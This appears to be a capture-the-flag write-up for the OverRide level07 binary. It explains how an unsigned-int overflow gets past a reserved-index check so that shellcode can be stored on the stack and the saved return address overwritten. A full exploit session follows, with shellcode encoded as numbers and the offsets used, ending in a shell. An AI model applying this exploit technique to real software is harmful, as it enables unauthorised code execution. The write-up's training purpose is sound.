@@ -1,0 +1,73 @@
+In this level, we have a CLI asking us to read or store number into a "storage".
+
+If we want to store something, he ask us for a number to store and then the index.
+If the index is a multiple of 3, he will not store it and say:
+ *** ERROR! ***
+   This index is reserved for wil!
+ *** ERROR! ***
+ Failed to do store command
+
+But, the stdin is read by scanf who interpret it as an unsigned int, so we can use this to write at these indexes.
+With this, we can also navigate throught the stack and change the EIP of the main, but this program delete the ENV
+at the beginning so we can't use it to store our shellcode.
+
+So, we have to store our shellcode in the stack with the "store" command, and in the right order by bypassing the 
+"multiple of 3" security.
+
+And then, when the shellcode is stored, we have to overwrite the EIP to our shellcode.
+GDB will give us the EIP, but for the address of the shellcode in the table, we can show it directly and the CLI
+by finding the right offset with GDB. this offset is -9.
+(We could also use a nop sled but it will be complicated because of the mulitple of 3 limit).
+
+##############################################
+
+The shellcode used is this one: http://shell-storm.org/shellcode/files/shellcode-827.php
+
+level07@OverRide:~$ ./level07
+----------------------------------------------------
+  Welcome to wil's crappy number storage service!
+----------------------------------------------------
+ Commands:
+    store - store a number into the data storage
+    read  - read a number from the data storage
+    quit  - exit the program
+----------------------------------------------------
+   wil has reserved some storage :>
+----------------------------------------------------
+
+Input command: store
+ Number: 1750122545
+ Index: 1073741824
+ Completed store command successfully
+Input command: store
+ Number: 1752379183
+ Index: 1
+ Completed store command successfully
+Input command: store
+ Number: 1768042344
+ Index: 2
+ Completed store command successfully
+Input command: store
+ Number: 1357089134
+ Index: 1073741827
+ Completed store command successfully
+Input command: store
+ Number: 2967570771
+ Index: 4
+ Completed store command successfully
+Input command: store
+ Number: 8441099
+ Index: 5
+ Completed store command successfully
+Input command: read
+ Index: -9
+ Number at data[4294967287] is 4294956340 //    L'addresse du tableau correspondant à notre shellcode
+ Completed read command successfully
+Input command: store
+ Number: 4294956340
+ Index: 1073741938                          //  l'EIP à écraser
+ Completed store command successfully
+Input command: quit
+$ whoami
+level08
+$
